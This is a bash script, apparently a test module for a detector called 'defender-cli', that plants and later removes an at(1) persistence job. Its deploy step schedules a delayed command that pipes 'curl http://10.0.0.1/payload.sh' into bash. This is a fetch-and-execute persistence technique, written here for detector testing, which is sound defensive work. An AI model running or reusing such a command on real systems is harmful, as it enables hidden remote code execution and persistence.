#!/usr/bin/env bash
# at(1) persistence: a delayed command scheduled far enough out to survive testing.
# Requires the 'at' package (pacman -S at && systemctl enable --now atd).
# Detected by: defender-cli anti-persistence --at-jobs
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

TAG="DEFENDER_TEST_AT"

case "${1:-}" in
  deploy)
    if ! command -v at &>/dev/null; then
      echo "[-] 06_at_job: 'at' not installed (pacman -S at); skipping"
      exit 0
    fi
    echo "$TAG=1; curl -s http://10.0.0.1/payload.sh | bash" | at "now + 8 hours" 2>/dev/null
    echo "[+] 06_at_job: fetch-and-execute job scheduled 8 hours out"
    ;;
  cleanup)
    command -v at &>/dev/null || exit 0
    for job in $(atq 2>/dev/null | awk '{print $1}'); do
      if at -c "$job" 2>/dev/null | grep -q "$TAG"; then
        atrm "$job" 2>/dev/null && echo "[-] 06_at_job: removed at job $job"
      fi
    done
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
